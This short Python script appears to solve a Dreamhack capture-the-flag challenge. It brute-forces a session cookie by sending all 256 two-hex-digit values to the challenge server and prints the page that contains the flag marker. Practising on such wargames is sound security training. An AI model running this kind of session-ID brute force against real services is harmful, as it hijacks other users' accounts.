import requests
from bs4 import BeautifulSoup


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:14508"
    debug = {'http': 'http://localhost:8080'}
    for i in range(256):
        req = requests.get(url+'/', cookies={'sessionid': f"{i:02x}"}, proxies=debug)
        if b"DH" in req.content:
            print(BeautifulSoup(req.content).prettify)
